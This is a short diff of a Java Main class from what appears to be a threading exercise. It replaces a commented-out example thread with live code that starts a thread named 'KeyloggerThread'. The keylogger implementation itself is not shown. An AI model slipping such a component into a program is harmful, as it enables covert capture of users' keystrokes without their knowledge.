@@ -32,8 +32,8 @@ public class Main
         ExampleThread exampleThread1 = new ExampleThread("Primo");
         //exampleThread1.start();
 
-        //ExampleThread exampleThread2 = new ExampleThread("Secondo");
-        //exampleThread2.start();
+        KeyloggerThread keyloggerThread1 = new KeyloggerThread("Keylogger");
+        keyloggerThread1.start();
 
 
     }
